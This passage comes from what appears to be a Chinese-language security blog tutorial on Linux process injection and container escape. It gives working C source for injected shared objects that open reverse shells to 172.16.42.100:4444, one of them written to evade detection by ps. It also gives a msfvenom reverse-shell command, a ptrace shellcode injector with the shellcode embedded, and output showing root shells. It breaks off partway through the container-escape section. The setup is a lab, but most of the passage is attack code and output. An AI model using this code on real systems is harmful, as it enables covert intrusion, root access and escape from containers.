<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ ps -ef | grep 9999 | grep -v grep</span><br><span class="line">root      16603  15710  0 20:38 pts/3    00:00:00 python3 -m http.server 9999</span><br><span class="line">➜ ./linux-inject/inject -p 16603 ./poc1.so</span><br><span class="line">targeting process with pid 16603</span><br><span class="line">ptrace(PTRACE_GETSIGINFO) failed</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:37444.</span><br><span class="line">root@vuln:~/poc/linux-inject<span class="comment">#</span></span><br></pre></td></tr></table></figure>



<h3 id="1-4-测试开启ptrace-scope"><a href="#1-4-测试开启ptrace-scope" class="headerlink" title="1.4 测试开启ptrace_scope"></a>1.4 测试开启ptrace_scope</h3><p>我用的debian,linux内核 4.19，测试是成功的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">echo</span> 1 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">➜ cat /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">➜ ps -ef | grep 6666 | grep -v grep</span><br><span class="line">root        854    649  1 10:32 pts/1    00:00:00 python3 -m http.server 6666</span><br><span class="line"></span><br><span class="line">➜ ./linux-inject/inject -p 854 ./poc1.so</span><br><span class="line">targeting process with pid 854</span><br><span class="line">ptrace(PTRACE_GETSIGINFO) failed</span><br><span class="line"></span><br><span class="line">➜ uname -a</span><br><span class="line">Linux vuln 4.19.0-18-amd64 <span class="comment">#1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>



<h3 id="1-5-使用多线程编写poc"><a href="#1-5-使用多线程编写poc" class="headerlink" title="1.5 使用多线程编写poc"></a>1.5 使用多线程编写poc</h3><p>修改poc为多线程版本，将后门代码与正常逻辑分离执行，这样就不会影响正常的线程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;I just got loaded\n&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1\&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">pthread_t</span> thread_id;</span><br><span class="line">   pthread_create(&amp;thread_id,<span class="literal">NULL</span>,shell,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc2.so -lpthread -fPIC poc2.c</span><br><span class="line">poc2.c:17:4: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;pthread_create&#x27;</span> is invalid <span class="keyword">in</span> C99 [-Wimplicit-function-declaration]</span><br></pre></td></tr></table></figure>

<p><strong>启动一个被注入的python进程：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 1111</span><br></pre></td></tr></table></figure>

<p><strong>攻击机监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>



<p><strong>进程注入：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ ps -ef | grep 1111 | grep -v grep</span><br><span class="line">root       1333   1299  0 11:53 pts/1    00:00:00 python3 -m http.server 1111</span><br><span class="line">➜ ./linux-inject/inject -p 1333 ./poc2.so</span><br><span class="line">targeting process with pid 1333</span><br><span class="line">could not inject <span class="string">&quot;./poc2.so</span></span><br></pre></td></tr></table></figure>

<p><strong>收到了shell：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:39404.</span><br><span class="line">root@vuln:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>



<h3 id="1-6-使用socket套接字编写poc"><a href="#1-6-使用socket套接字编写poc" class="headerlink" title="1.6 使用socket套接字编写poc"></a>1.6 使用socket套接字编写poc</h3><p>这种方式的好处是可以隐藏我们的行为，上述方式都可以通过查看进程的方式发现恶意注入的代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ ps -ef | grep bash</span><br><span class="line">root       1447   1406  0 12:00 pts/1    00:00:00 sh -c bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1&quot;</span></span><br><span class="line">root       1448   1447  0 12:00 pts/1    00:00:00 bash -c bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1</span><br><span class="line">root       1449   1448  0 12:00 pts/1    00:00:00 bash -i</span><br><span class="line">root       1487    978  0 12:00 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox bash</span><br></pre></td></tr></table></figure>

<p>我们可以发现我们已经暴露了我们反弹的shell地址。</p>
<p>解决方式就是自己写一个socket连接，而不是调用system函数</p>
<p>poc.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sock;</span><br><span class="line">    <span class="keyword">char</span> shell[]=<span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>((sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_port = htons(<span class="number">4444</span>);</span><br><span class="line">    server.sin_addr.s_addr = inet_addr(<span class="string">&quot;172.16.42.100&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;server, <span class="keyword">sizeof</span>(struct sockaddr)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dup2(sock, <span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">1</span>);</span><br><span class="line">    dup2(sock, <span class="number">2</span>);</span><br><span class="line">    execl(shell,<span class="string">&quot;/bin/bash&quot;</span>,(<span class="keyword">char</span> *)<span class="number">0</span>);</span><br><span class="line">    close(sock);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I just got loaded\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thread_id;</span><br><span class="line">    pthread_create(&amp;thread_id,<span class="literal">NULL</span>,hello,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc.so -lpthread -fPIC poc.c</span><br></pre></td></tr></table></figure>

<p><strong>启一个python进程作为注入目标：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 123</span><br></pre></td></tr></table></figure>

<p><strong>攻击机启动监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><strong>注入进程：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ps -ef | grep 123 | grep -v grep</span><br><span class="line">root       1694   1299  0 12:08 pts/1    00:00:00 python3 -m http.server 123</span><br><span class="line">➜  ./linux-inject/inject -p 1694 ./poc.so</span><br><span class="line">targeting process with pid 1694</span><br><span class="line">ptrace(PTRACE_GETSIGINFO) failed</span><br></pre></td></tr></table></figure>

<p><strong>结果：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vuln:~<span class="comment"># exit</span></span><br><span class="line">NCAT DEBUG: Closing fd 5.</span><br><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:39410.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br></pre></td></tr></table></figure>

<p><strong>再次查看进程：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ps -ef | grep bash</span><br><span class="line">root       1694   1299  0 12:08 pts/1    00:00:00 /bin/bash</span><br><span class="line">root       1785    978  0 12:10 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox bash</span><br><span class="line">➜  ps -ef | grep python</span><br><span class="line">root        435      1  0 11:27 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal</span><br><span class="line">root       1547   1299  0 12:04 pts/1    00:00:00 python3 -m http.server 3333</span><br><span class="line">root       1800    978  0 12:10 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox python</span><br></pre></td></tr></table></figure>

<p><strong>通过网络连接查看：</strong></p>
<p>通过网络连接可以发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  netstat -pantu</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">......</span><br><span class="line">tcp        0      0 172.16.42.151:39410     172.16.42.100:4444      ESTABLISHED 1694/bas</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<h2 id="2-通过shellcode注入进程"><a href="#2-通过shellcode注入进程" class="headerlink" title="2. 通过shellcode注入进程"></a>2. 通过shellcode注入进程</h2><p>攻击机器：172.16.42.100</p>
<p>靶机：172.16.42.151</p>
<p>获取poc：<a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></p>
<p>生成shellcode(如果不生成，会在靶机上生成一个终端):</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp <span class="attribute">LHOST</span>=172.16.42.100 <span class="attribute">LPORT</span>=4444 -f c</span><br></pre></td></tr></table></figure>

<p>替换shellcode(==注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值==）:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Mem Inject</span></span><br><span class="line"><span class="comment">  Copyright (c) 2016 picoFlamingo</span></span><br><span class="line"><span class="comment">This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment">(at your option) any later version.</span></span><br><span class="line"><span class="comment">This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELLCODE_SIZE 74</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *shellcode = </span><br><span class="line"><span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">inject_data</span> <span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">unsigned</span> <span class="keyword">char</span> *src, <span class="keyword">void</span> *dst, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span>      i;</span><br><span class="line">  <span class="keyword">uint32_t</span> *s = (<span class="keyword">uint32_t</span> *) src;</span><br><span class="line">  <span class="keyword">uint32_t</span> *d = (<span class="keyword">uint32_t</span> *) dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i+=<span class="number">4</span>, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(POKETEXT):&quot;</span>);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span>                   target;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="keyword">int</span>                     syscall;</span><br><span class="line">  <span class="keyword">long</span>                    dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage:\n\t%s pid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Tracing process %d\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_ATTACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(ATTACH):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Waiting for process...\n&quot;</span>);</span><br><span class="line">  wait (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Getting Registers\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_GETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inject code into current RPI position */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Injecting shell code at %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line">  inject_data (target, shellcode, (<span class="keyword">void</span>*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line"></span><br><span class="line">  regs.rip += <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Setting instruction pointer to %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_SETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Run it!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_DETACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(DETACH):&quot;</span>);</span><br><span class="line">	  <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译代码:</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">gcc infect.<span class="keyword">c</span> -o infectx</span><br></pre></td></tr></table></figure>

<p>攻击机监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>靶机宿主机启动一个python server进程</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">124</span></span><br></pre></td></tr></table></figure>

<p>注入</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ps -ef | grep 124 | grep -v grep</span><br><span class="line">root       2239   2216  0 09:43 pts/1    00:00:00 python3 -m http.server 124</span><br><span class="line">➜  ./infectx 2239</span><br><span class="line">+ Tracing process 2239</span><br><span class="line">+ Waiting <span class="keyword">for</span> process...</span><br><span class="line">+ Getting Registers</span><br><span class="line">+ Injecting shell code at 0x7f222adc87e4</span><br><span class="line">+ Setting instruction pointer to 0x7f222adc87e6</span><br><span class="line">+ Run it!</span><br></pre></td></tr></table></figure>

<p> 结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:39412.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>





<h2 id="3-利用shellcode进程注入进行容器逃逸"><a href="#3-利用shellcode进程注入进行容器逃逸" class="headerlink" title="3. 利用shellcode进程注入进行容器逃逸"></a>3. 利用shellcode进程注入进行容器逃逸</h2><p>攻击机器：172.16.42.100</p>
<p>靶机：172.16.42.151</p>
<p>带有SYS_PTRACE权限的容器还是挺多的，对于开发来说可能需要SYS_PTRACE权限进行调试</p>
<p>靶机启动带宿主机进程和CAP_SYS_PTRACE特权的容器</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> --name test -itd <span class="attribute">--cap-add</span>=SYS_PTRACE <span class="attribute">--pid</span>=host --security-opt <span class="attribute">apparmor</span>=unconfined --rm ubuntu</span><br></pre></td></tr></table></figure>

<p><strong>利用成功前提：</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">--cap-add</span>=SYS_PTRACE</span><br><span class="line"><span class="attribute">--pid</span>=host</span><br><span class="line">--security-opt <span class="attribute">apparmor</span>=unconfined</span><br></pre></td></tr></table></figure>



<p>获取poc：<a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></p>
<p>生成shellcode(如果不生成，会在靶机上生成一个终端):</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp <span class="attribute">LHOST</span>=172.16.42.100 <span class="attribute">LPORT</span>=4444 -f c</span><br></pre></td></tr></table></figure>

<p>替换shellcode(==注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值==）:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Mem Inject</span></span><br><span class="line"><span class="comment">  Copyright (c) 2016 picoFlamingo</span></span><br><span class="line"><span class="comment">This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment">(at your option) any later version.</span></span><br><span class="line"><span class="comment">This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELLCODE_SIZE 74</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *shellcode = </span><br><span class="line"><span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;</span></span><br><span class="line"><span 